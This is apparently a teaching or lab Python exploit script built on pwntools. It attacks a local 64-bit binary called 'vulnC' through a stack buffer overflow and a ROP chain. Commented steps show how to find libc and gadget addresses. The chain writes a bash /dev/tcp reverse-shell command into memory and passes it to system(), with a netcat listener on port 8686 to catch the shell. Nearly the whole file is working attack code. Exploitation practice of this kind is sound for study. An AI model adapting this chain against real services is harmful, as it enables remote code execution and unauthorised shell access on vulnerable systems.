import struct
import pwn

# vulnC is a 64-bit dynamically linked binary
# It's stack is not executable, ASLR is turned off
# It is running 'remotely' on localhost:8677

# Reverse shell will attempt to connect back to 127.0.0.1:8686
# So listen with nc (nc -lvnp 8686)

TARGET_HOST = '127.0.0.1'
TARGET_PORT = 8677

target = pwn.remote(TARGET_HOST, TARGET_PORT)
libc_elf = pwn.ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

# Step 1) Obtain libc base, system(), and exit() addresses
# There are a number of ways to accomplish each of these tasks

# Obtaining libc base:
	# run binary in gdb and use vmmap:
	# 0x00007ffff7dbd000 0x00007ffff7ddf000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
libc_base = 0x00007ffff7dbd000

# Obtaining address of system() and exit() (there are many ways you could do this)
# You could do 'print system'/'print exit' in gdb
	# $1 = {int (const char *)} 0x7ffff7e10290 <__libc_system>
	# $2 = {void (int)} 0x7ffff7e04a40 <__GI_exit>
# Or, you could find the offset in libc with:
# objdump -D /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep system
# Or just:
system_offset = libc_elf.symbols['system']
exit_offset = 	libc_elf.symbols['exit']
# and add that offset to the libc base addr

system_addr = struct.pack("<Q", libc_base + system_offset)
exit_addr = struct.pack("<Q", libc_base + exit_offset)

# Step 2) Obtain pop rdi gadget:
# ropper --file vulnC --search "pop rdi; ret;"
# 0x0000000000401673: pop rdi; ret;
pop_rdi = struct.pack("<Q", 0x00401673)
ret_instruction = struct.pack("<Q", 0x00401673 + 1) # This is needed because x86_64 requires that calls be 16-byte aligned (see below)

# Step 3) obtain move to memory gadget: 
# ropper --file /usr/lib/x86_64-linux-gnu/libc-2.31.so --search "mov [rax]"
# 0x0000000000033d17: mov qword ptr [rax], rdx; ret;
#
# ropper --file /usr/lib/x86_64-linux-gnu/libc-2.31.so --search "pop rax"
# 0x0000000000036174: pop rax; ret
# 
# ropper --file /usr/lib/x86_64-linux-gnu/libc-2.31.so --search "pop rdx"
# 0x0000000000142c92: pop rdx; ret;

# These gadgets are in libc, so libc_base needs to be added:
pop_rax = struct.pack("<Q", libc_base + 0x36174)
pop_rdx = struct.pack("<Q", libc_base + 0x142c92)
mov_rax = struct.pack("<Q", libc_base + 0x33d17)

# Step 3) Obtain writeable memory address:
# Can do this with vmmap or /proc/pid/maps
# 7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0
writeable_mem = 0x7ffff7ffe000


##############################
#### Assemble the Payload ####
##############################

# len(command) = 49 bytes
command = b"bash -c 'bash -i >& /dev/tcp/127.0.0.1/8686 0>&1'"

payload = b'a'*152 # 152 is position of return address found from cyclic

# Write string to writeable memory
for i in range(0, len(command), 8):
    payload += pop_rax
    payload += struct.pack("<Q", writeable_mem + i) # put writable memory address in rax
    payload += pop_rdx
    payload += command[i:i+8].ljust(8, b'\x00') # put next 8 bytes of payload into rdx
    payload += mov_rax

payload += pop_rdi 
payload += struct.pack("<Q", writeable_mem) # Put the address of our command string in rdi
# The length of our command is 49 bytes, which means the loop will run 7 times
# each time, 5 * 8 = 40 bytes are added to the payload
# 40 * 7 = 280. Then we add pop_rdi and the writeable mem addr
# So, the total is now 296 bytes + the 152 bytes of overflow = 448
# 448 % 16 = 0, so we are still 16 byte aligned relative to what was 'supposed' to be on top of the stack
# Therefore, we do not need the extra ret_instruction for 16-byte stack alignment
# This is a nice way of making this more versatile though:
if len(payload) % 16 != 0:
    payload += ret_instruction
payload += system_addr # system() will get its arg from $rdi which is where we have pushed the pointer to our command string
payload += exit_addr

if len(payload) > 1024:
    print(f"Payload is too long! {len(payload)} > 1024")

rec_str = target.recv(1024) # Receive prompt from binary

print(rec_str)

target.sendline(payload)
